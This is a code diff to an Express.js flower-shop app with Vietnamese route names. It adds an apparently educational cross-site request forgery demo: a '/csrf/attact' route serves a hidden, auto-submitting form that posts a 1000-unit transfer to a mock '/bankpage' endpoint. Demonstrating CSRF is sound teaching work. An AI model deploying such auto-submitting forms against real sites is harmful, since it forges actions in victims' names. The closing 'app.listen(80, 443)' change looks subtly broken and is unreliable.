@@ -204,7 +204,23 @@ async function XoaLoaiHoa(res) {
     dslh: dslh
   });
 }
-
+app.get("/csrf/attact", async function (req, res){
+  res.send(`
+  <html>
+  <body>
+    <form action="/bankpage" method="POST">
+      <input type="hidden" name="username" value="pwned@evil-user.net" />
+      <input type="hidden" name="money" value="1000" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+  </html>
+`)});
+app.post("/bankpage", async function (req, res){
+  res.send("Ban da chuyen "+req.body.money+" cho "+req.body.username);
+})  
 app.get('/xoaloaihoa', function (req, res) {
   XoaLoaiHoa(res);
 });
@@ -512,6 +528,6 @@ app.post('/comments/:mahoa', async function (req, res) {
 })
 app.get("/loaihoa", loaihoaController.select, (req, res) => {
 
-});
 
-app.listen(80);
+});
+app.listen(80, 443);
